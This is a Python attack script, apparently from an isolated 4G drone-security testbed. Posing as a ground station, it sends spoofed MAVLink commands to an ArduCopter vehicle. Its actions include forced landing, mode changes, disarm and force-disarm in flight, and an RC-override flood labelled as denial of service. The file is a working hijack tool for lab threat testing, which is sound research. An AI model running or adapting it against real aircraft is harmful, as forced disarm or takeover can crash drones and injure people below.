#!/usr/bin/env python3
"""TM1 inject — send spoofed MAVLink commands from the Rogue UE.

Run from the ROGUE UE network namespace:
  docker run -i --rm --network container:srsue_zmq3 dah-testbed-air \
    python3 - --action capabilities < testbed-4g/scripts/tm1_inject.py

Use only inside the isolated DAH testbed. The default action is benign; actions
such as land/disarm/force-disarm are intended for controlled flight-lab tests.
"""
import argparse
import json
import sys
import time


DEFAULT_TARGET = "udpout:192.168.100.2:14550"
mavutil = None

MODE_CUSTOM = {
    # ArduCopter common custom modes.
    "STABILIZE": 0,
    "ACRO": 1,
    "ALT_HOLD": 2,
    "AUTO": 3,
    "GUIDED": 4,
    "LOITER": 5,
    "RTL": 6,
    "CIRCLE": 7,
    "LAND": 9,
    "DRIFT": 11,
    "SPORT": 13,
    "FLIP": 14,
    "AUTOTUNE": 15,
    "POSHOLD": 16,
    "BRAKE": 17,
    "THROW": 18,
    "AVOID_ADSB": 19,
    "GUIDED_NOGPS": 20,
    "SMART_RTL": 21,
}


def now():
    return time.strftime("%H:%M:%S")


def event(kind, **fields):
    print(json.dumps({"t": now(), "kind": kind, **fields},
                     ensure_ascii=False), flush=True)


def send_gcs_heartbeats(m, count, interval):
    for i in range(count):
        m.mav.heartbeat_send(mavutil.mavlink.MAV_TYPE_GCS,
                             mavutil.mavlink.MAV_AUTOPILOT_INVALID,
                             0, 0, 0)
        event("sent_heartbeat", seq=i + 1)
        time.sleep(interval)


def wait_replies(m, command=None, timeout=5.0):
    deadline = time.time() + timeout
    got = []
    while time.time() < deadline:
        msg = m.recv_match(blocking=True, timeout=0.5)
        if not msg or msg.get_type() == "BAD_DATA":
            continue
        t = msg.get_type()
        rec = {"msg_type": t, "src_sys": msg.get_srcSystem(),
               "src_comp": msg.get_srcComponent()}
        if t == "COMMAND_ACK":
            rec.update(command=msg.command, result=msg.result)
            if command is None or msg.command == command:
                got.append(rec)
        elif t in ("STATUSTEXT",):
            rec.update(text=getattr(msg, "text", ""))
        elif t == "HEARTBEAT":
            rec.update(base_mode=msg.base_mode, custom_mode=msg.custom_mode)
        event("rx", **rec)
    return got


def command_long(m, command, params):
    p = list(params) + [0] * (7 - len(params))
    m.mav.command_long_send(1, 1, command, 0, *p[:7])
    event("sent_command_long", command=command, params=p[:7])


def main():
    global mavutil
    ap = argparse.ArgumentParser(description="TM1 spoofed MAVLink injection")
    ap.add_argument("--target", default=DEFAULT_TARGET,
                    help=f"UAV MAVLink endpoint, default {DEFAULT_TARGET}")
    ap.add_argument("--source-system", type=int, default=255)
    ap.add_argument("--source-component", type=int, default=190)
    ap.add_argument("--action", default="capabilities",
                    choices=["capabilities", "mode", "land", "disarm",
                             "force-disarm", "rc-dos"])
    ap.add_argument("--mode", default="LAND",
                    help="mode for --action mode, e.g. LAND/RTL/GUIDED")
    ap.add_argument("--duration", type=float, default=6.0,
                    help="reply wait time, or rc-dos send duration")
    ap.add_argument("--heartbeat-count", type=int, default=5)
    ap.add_argument("--heartbeat-interval", type=float, default=0.2)
    ap.add_argument("--rate-hz", type=float, default=20.0,
                    help="RC override rate for --action rc-dos")
    args = ap.parse_args()

    from pymavlink import mavutil as _mavutil
    mavutil = _mavutil

    event("start", target=args.target, action=args.action,
          source_system=args.source_system,
          source_component=args.source_component)
    m = mavutil.mavlink_connection(
        args.target,
        source_system=args.source_system,
        source_component=args.source_component,
    )
    try:
        m.port.settimeout(0.2)
    except Exception:
        pass

    send_gcs_heartbeats(m, args.heartbeat_count, args.heartbeat_interval)

    expected_ack = None
    if args.action == "capabilities":
        expected_ack = mavutil.mavlink.MAV_CMD_REQUEST_AUTOPILOT_CAPABILITIES
        command_long(m, expected_ack, [1])
    elif args.action == "mode":
        mode = args.mode.upper()
        if mode not in MODE_CUSTOM:
            raise SystemExit(f"unknown ArduCopter mode {mode}; known={sorted(MODE_CUSTOM)}")
        expected_ack = mavutil.mavlink.MAV_CMD_DO_SET_MODE
        command_long(m, expected_ack,
                     [mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
                      MODE_CUSTOM[mode]])
    elif args.action == "land":
        expected_ack = mavutil.mavlink.MAV_CMD_NAV_LAND
        command_long(m, expected_ack, [0, 0, 0, 0, 0, 0, 0])
    elif args.action == "disarm":
        expected_ack = mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM
        command_long(m, expected_ack, [0, 0, 0, 0, 0, 0, 0])
    elif args.action == "force-disarm":
        expected_ack = mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM
        command_long(m, expected_ack, [0, 21196, 0, 0, 0, 0, 0])
    elif args.action == "rc-dos":
        interval = 1.0 / max(args.rate_hz, 1.0)
        deadline = time.time() + args.duration
        count = 0
        while time.time() < deadline:
            # Neutral values, high-frequency contention proof rather than stick motion.
            m.mav.rc_channels_override_send(1, 1, 1500, 1500, 1500, 1500,
                                            0, 0, 0, 0)
            count += 1
            time.sleep(interval)
        event("sent_rc_override_burst", count=count, rate_hz=args.rate_hz)

    replies = wait_replies(m, expected_ack, timeout=args.duration)
    event("summary", action=args.action, ack_count=len(replies),
          detail="check tm1_monitor.py for vehicle-state impact")
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        print("\n[tm1_inject] interrupted", file=sys.stderr)
        raise SystemExit(130)
